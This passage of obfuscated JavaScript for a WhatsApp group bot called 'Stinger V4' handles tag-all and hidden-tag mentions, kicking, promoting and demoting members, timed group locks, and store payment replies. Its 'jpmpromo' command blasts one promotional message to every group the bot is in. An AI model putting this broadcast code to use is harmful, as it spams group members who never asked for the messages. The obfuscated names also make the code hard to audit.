ꜱᴛɪɴɢᴇʀ ɢʀᴏᴜᴘ +\n> 𝐩𝐫𝐨𝐦𝐨𝐭𝐞 ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐬𝐚𝐯𝐞 ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐝𝐞𝐥 ◁️❄️🕷️\n> 𝐤𝐢𝐜𝐤𝐚𝐥𝐥 ◁️❄️🕷️\n\n╰⭑➤➤⭑➤➤⭑➤  ꜱᴛɪɴɢᴇʀ ᴏᴡɴᴇʀ +\n> 𝐬𝐭𝐢𝐧𝐠-𝐛𝐥𝐨𝐜𝐤 [ 𝐧𝐮𝐦𝐛𝐞𝐫 ] ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐮𝐧𝐛𝐥𝐨𝐜𝐤 [ 𝐧𝐮𝐦𝐛𝐞𝐫 ] ◁️❄️🕷️\n\n╰⭑➤➤⭑➤➤⭑➤ ꜱᴛɪɴɢᴇʀ ɢʀᴏᴜᴘ\n> 𝐡𝐢𝐝𝐞𝐭𝐚𝐠 ◁️❄️🕷️\n> 𝐭𝐚𝐠𝐚𝐥𝐥 ◁️❄️🕷️\n> 𝐬𝐭𝐢𝐧𝐠-𝐤𝐢𝐜𝐤 ◁️❄️🕷️\n> 𝐩𝐫𝐨𝐦𝐨𝐭𝐞 ◁️❄️🕷️\n> 𝐝𝐞𝐦𝐨𝐭𝐞 ◁️❄️🕷";
          let _0x1e16bc = global.isLink;
          let _0x83662a = generateWAMessageFromContent(m.chat, {
            extendedTextMessage: {
              text: _0x413632,
              footer: "Powered by ❄️𝐒𝐓𝐈𝐍𝐆𝐄𝐑 𝐕𝟒❄️",
              contextInfo: {
                externalAdReply: {
                  title: "𝐒𝐓𝐈𝐍𝐆𝐄𝐑-𝐕𝟒",
                  mediaUrl: _0x1e16bc,
                  thumbnail: await fs.readFileSync("./database/image/ES_TEAMS.jpg"),
                  mediaType: 2,
                  sourceUrl: _0x1e16bc
                },
                mentionedJid: [m.sender],
                isForwarded: true,
                forwardingScore: 127
              }
            }
          }, {});
          await sock.relayMessage(_0x83662a.key.remoteJid, _0x83662a.message, {
            messageId: _0x83662a.key.id
          });
          const _0x527e7a = {
            audio: _0x564031,
            mimetype: "audio/mp4",
            ptt: true
          };
          await sock.sendMessage(m.chat, _0x527e7a, {
            quoted: m
          });
        }
        break;
      case "z":
      case "hidetag":
        if (!isOwner) {
          return _0x1595c1(mess.only.owner);
        }
        if (!text2) {
          return _0x1595c1("Teks?");
        }
        sock.sendMessage(m.chat, {
          text: text2 ? text2 : "",
          mentions: participants.map(_0x14e62c => _0x14e62c.id)
        }, {
          quoted: m
        });
        break;
      case "tagall":
        {
          if (!isOwner && !isAdmin2) {
            return _0x1595c1(mess.admin);
          }
          if (!isGroup) {
            return joreply(mess.only.group);
          }
          if (!q) {
            return _0x1595c1("🧊𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒 𝐂𝐚𝐧𝐧𝐨𝐭 𝐅𝐢𝐧𝐝 𝐚 𝐓𝐞𝐱𝐭🧊");
          }
          let _0x3261b4 = (q ? q : "") + "\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n";
          for (let _0x80a442 of participants) {
            _0x3261b4 += "⊝ @" + _0x80a442.id.split("@")[0] + "\n";
          }
          sock.sendMessage(m.chat, {
            text: _0x3261b4,
            mentions: participants.map(_0x2abfed => _0x2abfed.id)
          }, {
            quoted: m
          });
        }
        break;
      case "sting-kick":
        {
          if (!isGroup) {
            return _0x1595c1("Only Group");
          }
          if (!isAdmin2 && !isOwner) {
            return _0x1595c1("Only Admin");
          }
          if (!isBotAdmin) {
            return _0x1595c1("Bot Is Not Admin :(");
          }
          let _0x3b504b = m.quoted ? m.quoted.sender : text2.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await sock.groupParticipantsUpdate(m.chat, [_0x3b504b], "remove").then(_0x482e70 => _0x1595c1(util.format(_0x482e70))).catch(_0x2f55f9 => _0x1595c1(util.format(_0x2f55f9)));
        }
        break;
      case "closegroup":
        {
          if (!isGroup) {
            return _0x1595c1("Group Only, Dummy");
          }
          if (!isAdmin2 && !isOwner) {
            return _0x1595c1("Admin Only");
          }
          if (!isBotAdmin) {
            return _0x1595c1("Bot Is Not Admin, Dummy");
          }
          if (!args[0]) {
            return _0x1595c1("*Choose Time:*\n-second\n-minute\n-hour\n-day\n\n*Example:*\n" + (prefixMatch + command) + "10 second");
          }
          if (args[1] == "second") {
            var _0x346418 = args[0] * "1000";
          } else if (args[1] == "minute") {
            var _0x346418 = args[0] * "60000";
          } else if (args[1] == "hour") {
            var _0x346418 = args[0] * "3600000";
          } else if (args[1] == "day") {
            var _0x346418 = args[0] * "86400000";
          }
          _0x1595c1("*Time starts from now*");
          setTimeout(() => {
            var _0x527c82 = m.participant;
            sock.groupSettingUpdate(m.chat, "announcement");
            _0x1595c1("Time's Up!\nGroup Closed By Bot Because No One Was Guarding The Group\nGroup Will Reopen According To The Time Set By The Admin");
          }, _0x346418);
        }
        break;
      case "opengroup":
        {
          if (!isGroup) {
            return _0x1595c1("Group Only, Dummy");
          }
          if (!isAdmin2 && !isOwner) {
            return _0x1595c1("Admin Only");
          }
          if (!isBotAdmin) {
            return _0x1595c1("Bot Is Not Admin, Dummy");
          }
          if (!args[0]) {
            return _0x1595c1("*Choose Time:*\n-second\n-minute\n-hour\n-day\n\n*Example:*\n" + (prefixMatch + command) + "10 second");
          }
          if (args[1] == "second") {
            var _0x346418 = args[0] * "1000";
          } else if (args[1] == "minute") {
            var _0x346418 = args[0] * "60000";
          } else if (args[1] == "hour") {
            var _0x346418 = args[0] * "3600000";
          } else if (args[1] == "day") {
            var _0x346418 = args[0] * "86400000";
          }
          _0x1595c1("*Time starts from now*");
          setTimeout(() => {
            var _0x7d05c6 = m.participant;
            sock.groupSettingUpdate(m.chat, "not_announcement");
            _0x1595c1("Right On Time, The Group Is Now Open, All Participants Can Send Messages");
          }, _0x346418);
        }
        break;
      case "demote":
        {
          if (!isGroup) {
            return _0x1595c1("Only Group");
          }
          if (!isAdmin2 && !isOwner) {
            return _0x1595c1("Only Admin");
          }
          if (!isBotAdmin) {
            return _0x1595c1("Bot Is Not Admin :(");
          }
          let _0x585bcf = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text2.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await sock.groupParticipantsUpdate(m.chat, [_0x585bcf], "demote").then(_0x43dec5 => _0x1595c1(util.format(_0x43dec5))).catch(_0x179a2e => _0x1595c1(util.format(_0x179a2e)));
        }
        break;
      case "promote":
        {
          if (!q) {
            return _0x1595c1("🧊𝐓𝐚𝐠 𝐚 𝐮𝐬𝐞𝐫 𝐭𝐨 𝐏𝐫𝐨𝐦𝐨𝐭𝐞 𝐮𝐬𝐢𝐧𝐠 𝐒𝐭𝐢𝐧𝐠𝐞𝐫 𝐕𝟒🧊");
          }
          if (!m.isGroup) {
            return _0x1595c1(mess.group);
          }
          if (!isAdmin2 && !isGroupOwner && !isCreator) {
            return _0x1595c1(mess.admin);
          }
          if (!isBotAdmin) {
            return _0x1595c1(mess.botAdmin);
          }
          let _0x5348c5 = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text2.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await sock.groupParticipantsUpdate(m.chat, [_0x5348c5], "promote").then(_0x68bafd => _0x1595c1(json(_0x68bafd))).catch(_0x3cf0e => _0x1595c1(json(_0x3cf0e)));
        }
        break;
      case "jpmpromosi":
      case "jpmpromo":
      case "jpm3":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          if (!text2 && !m.quoted) {
            return m.reply("Give a text or reply to a text");
          }
          var _0x23ee91 = m.quoted ? m.quoted.text : text2;
          let _0xc68e7e = 0;
          let _0xc37b04 = await sock.groupFetchAllParticipating();
          let _0x4fea5a = Object.entries(_0xc37b04).slice(0).map(_0x4a6c0e => _0x4a6c0e[1]);
          let _0x59ed94 = _0x4fea5a.filter(_0x1a3a6d => _0x1a3a6d.announce == false);
          let _0x306c5d = _0x59ed94.map(_0x81a2d2 => _0x81a2d2.id);
          m.reply("Processing Sending Message To *" + _0x306c5d.length + " Groups*");
          let _0x5260cd = _0x23ee91;
          const _0x19bf5b = {
            text: _0x5260cd
          };
          let _0x308ffe = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [m.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x19bf5b),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/2349037524605\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\"}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"YouTube Owner\",\"url\":\"" + linkyt + "\",\"merchant_url\":\"https://youtube.com/@esteams\"}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Testi Di whatsapp\",\"url\":\"" + isLink + "\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vaj1vKSK5cDDT4tVvY1y\"}"
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"𝐃𝐎𝐍𝐀𝐓𝐄🙏\",\"url\":\"https://i.ibb.co/3mW8Ywz/DONATE.jpg\",\"merchant_url\":\"https://i.ibb.co/3mW8Ywz/DONATE.jpg\"}"
                    }]
                  })
                })
              }
            }
          }, {
            userJid: m.sender,
            quoted: m
          });
          for (let _0x557990 of _0x306c5d) {
            try {
              await sock.relayMessage(_0x557990, _0x308ffe.message, {
                messageId: _0x308ffe.key.id
              });
              _0xc68e7e += 1;
            } catch {}
            await sleep(global.delayjpm);
          }
          m.reply("Successfully Sent Message To *" + _0xc68e7e + " Groups*");
        }
        break;
      case "payment":
        {
          let _0x1f3f81 = _0x1522f0("PAYMENT") + "\n\n*(E-WALLET)*\n\n   *DANA*\n- " + dana + "\n\nHarap Setelah Transfer Anda Harus Mengasih Bukti Pembayaran Agar Di Verifikasi Oleh Owner, Tanks For You\n\n© " + storename;
          const _0x4824d0 = {
            showAdAttribution: true,
            renderLargerThumbnail: false,
            title: "QRIS? KLIK DISINI",
            body: "Date : " + timeJakarta + ", " + todayShort,
            containsAutoReply: true,
            mediaType: 1,
            thumbnailUrl: "https://i.ibb.co/3mW8Ywz/DONATE.jpg",
            sourceUrl: "" + qris
          };
          const _0x3d748d = {
            forwardingScore: 9999999,
            isForwarded: true,
            mentionedJid: [m.sender],
            externalAdReply: _0x4824d0
          };
          const _0x12c93e = {
            text: _0x1f3f81,
            contextInfo: _0x3d748d
          };
          const _0x5abefa = {
            quoted: _0x39abf8
          };
          sock.sendMessage(from, _0x12c93e, _0x5abefa);
          await sleep(1500);
        }
        break;
      case "danamasuk":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          let _0x26bdd8 = "*DONE FUNDS RECEIVED*\n\nReqname :\n\n▰▰▰▰▰▰▰▰\n*7 Day Guarantee*\n*Create " + timeJakarta + "*\n*Today " + todayLong + "*";
          const _0x5a8277 = {
            text: _0x26bdd8
          };
          const _0x22f7f6 = {
            quoted: m
          };
          sock.sendMessage(from, _0x5a8277, _0x22f7f6);
        }
        break;
      case "proses":
        {
          m.reply("*READY, YOUR ORDER WILL BE PROCESSED, PLEASE WAIT A MOMENT*");
          sock.sendMessage("2349037524605@s.whatsapp.net", {
            text: "BRO ZYN THERE'S A TRANSACTION, HURRY UP AND PROCESS IT OR THE BUYER WILL GET MAD",
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true
            }
          });
        }
        break;
      case "done":
      case "d":
        {
          if (!isOwner) {
            return _0x1595c1("Whoa, who are you?");
          }
          let _0x5584c9 = text2.split(",");
          let _0x1a42ad = _0x5584c9[0];
          let _0x17669a = _0x5584c9[1];
          if (_0x5584c9.length < 2) {
            return _0x1595c1("*Wrong Format!*\nUsage:\n" + (prefixMatch + command) + " barang,nominal");
          }
          if (!_0x1a42ad) {
            return _0x1595c1("Ex : " + (prefixMatch + command) + " item,amount\n\nExample :\n" + (prefixMatch + command) + " vipies,60000");
          }
          if (!_0x17669a) {
            return _0x1595c1("Ex : " + (prefixMatch + command) + " item,amount\n\nExample :\n" + (prefixMatch + command) + " panel,1000");
          }
          text_done = "「 TRANSACTION SUCCESSFUL 」\n\n📦 Item : " + _0x1a42ad + "\n💸 Amount : " + _0x17669a + "\n📆 Date : " + timeJakarta + "\n🕰️ Time : " + currentTime + "\n✨ Status : Successful\n\nThank You For Ordering At *" + storename + "*";
          const _0x30d4e3 = {
            text: text_done,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true
              }
            }
          };
          const _0x29e35f = {
            extendedTextMessage: _0x30d4e3
          };
          await sock.relayMessage(m.chat, {
            requestPaymentMessage: {
              currencyCodeIso4217: "IDR",
              amount1000: _0x17669a + "*100000",
              requestFrom: m.sender,
              noteMessage: _0x29e35f
            }
          }, {});
        }
        break;
      case "sticker":
      case "stiker":
      case "s":
        {
          if (!isOwner) {
            return _0x1595c1(mess.only.owner);
          }
          if (!quoted) {
            return _0x1595c1("Send/Reply Image/Video/Gifs With Caption " + (prefixMatch + command) + "\nVideo Duration 1-9 Seconds");
          }
          if (/image/.test(mime)) {
            let _0x5c4102 = await quoted.download();
            const _0x31c8d0 = {
              packname: global.packname,
              author: global.author
            };
